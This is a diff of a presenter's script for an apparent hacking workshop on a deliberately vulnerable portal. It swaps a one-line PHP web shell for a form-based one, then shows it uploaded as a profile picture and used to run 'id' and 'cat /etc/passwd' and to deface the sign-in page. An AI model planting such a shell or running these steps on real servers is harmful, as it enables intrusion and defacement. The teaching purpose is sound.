@@ -91,34 +91,35 @@ Point at the new **DASHBOARD** and **ADMIN** tabs.
 
 > "This expects a photo. Let's find out whether it checks."
 
-Show `shell.php` in an editor - all 19 characters:
+Show `shell.php` in an editor - a text box and a Run button:
 
 ```php
-<?php system($_GET['c']); ?>
+<?php if(isset($_POST["c"])){echo "<pre>".htmlspecialchars(shell_exec($_POST["c"]))."</pre>";}?><body style=background:#fff;font-family:monospace;padding:16px><form method=post><input name=c style=width:95% autofocus><button>Run</button></form>
 ```
 
-> "Whatever you put in `c`, the server runs. That's it. That's the whole
-> program."
+> "Whatever you type in that box, the server runs. That's it. That's the
+> whole program."
 
 Upload it. It accepts.
 
 > "No complaint about the extension, because nobody looked. My profile
 > picture is now a program."
 
-Open it with `?c=id`.
+Click the broken avatar image - it opens in a new tab, same browser, same
+cookies. Type `id` in the box, press **Run**.
 
 > "`www-data`. That is not my browser. That is a command, running on a server
 > in a data centre, because I uploaded a file."
 
-Then `?c=ls -la`, then `?c=cat /etc/passwd`.
+Then `ls -la`, then `cat /etc/passwd`.
 
 ---
 
 ## 15:00 - The payoff (3 min)
 
 Open the **Deface the sign-in page** step in the guide. Press **COPY** on
-the one-line command - do not retype it, it is long on purpose - and open it
-in a new tab.
+the command - do not retype it, it is long on purpose - and paste it into
+the shell tab's box. Press **Run**.
 
 > "This is one shell command. It writes a whole page - styling, animation,
 > all of it - because once the server will run anything you send, 'anything'
@@ -130,7 +131,7 @@ Now open the portal's sign-in page.
 > damaging thing I could have done, because you can see it. Somebody notices
 > within the hour and it is fixed by Friday."
 
-Click **RESTORE SIGN-IN PAGE** in the corner.
+Click **RESTORE SIGN-IN PAGE**, centred near the bottom.
 
 ---
 
@@ -156,7 +157,7 @@ down.**
 
 ## Letting them play
 
-Give out the URL. Everything they need is in the panel on the right - 11
+Give out the URL. Everything they need is in the panel on the right - 12
 steps, a copy button on every payload, the student account at the top (sign
 in with it first - the injection is behind login now, not on the sign-in
 page itself).
@@ -177,6 +178,6 @@ Then stop talking and let them get stuck. Getting stuck is the lesson.
 | SQL payload returns nothing | Check for a smart-quote. Copy from the guide panel instead of typing. |
 | Can't log in as admin | Password is in `sql/01-schema.sql`. Keep moving. |
 | Upload seems to do nothing | It worked - the toast says where it went. The broken-image avatar *is* the shell. |
-| Shell gives a blank page | The command ran and printed nothing. Try `?c=id`. |
-| Deface command does nothing | It must be copied, not retyped - it is long and has exact punctuation. Press COPY. |
+| Shell gives a blank page | The command ran and printed nothing. Try `id`. |
+| Deface command does nothing | It must be pasted into the shell's box, not retyped - it is long and has exact punctuation. Press COPY, then Run. |
 | Site is wrecked | **RESET** in the top strip. Two seconds, and only yours. |
